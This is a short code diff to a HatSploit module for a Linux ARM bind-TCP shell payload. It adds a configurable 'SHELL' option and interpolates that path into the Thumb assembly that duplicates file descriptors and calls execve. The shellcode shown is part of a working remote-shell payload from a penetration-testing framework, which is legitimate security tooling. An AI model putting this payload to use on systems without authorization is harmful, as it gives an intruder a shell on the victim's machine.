@@ -24,6 +24,9 @@ class HatSploitPayload(Payload, Handler, Linux):
             'Type': BIND_TCP,
         })
 
+        self.shell = Option('SHELL', '/bin/sh', "Executable path.", True,
+                            advanced=True)
+
     def implant(self):
         return self.assemble(
             """
@@ -32,7 +35,7 @@ class HatSploitPayload(Payload, Handler, Linux):
                 bx r1
             """
         ) + self.assemble(
-            """
+            f"""
             start:
                 movs r7, 0x3f
                 movs r1, 2
@@ -46,7 +49,7 @@ class HatSploitPayload(Payload, Handler, Linux):
 
                 adr	r0, shell
                 subs r2, r2, r2
-                push {r0, r2}
+                push {{r0, r2}}
                 mov r1, sp
                 movs r7, 0xb
                 svc 1
@@ -54,7 +57,7 @@ class HatSploitPayload(Payload, Handler, Linux):
                 mov r8, r8
 
             shell:
-                .asciz "/bin/sh"
+                .asciz "{self.shell.value}"
             """,
             mode='thumb'
         )
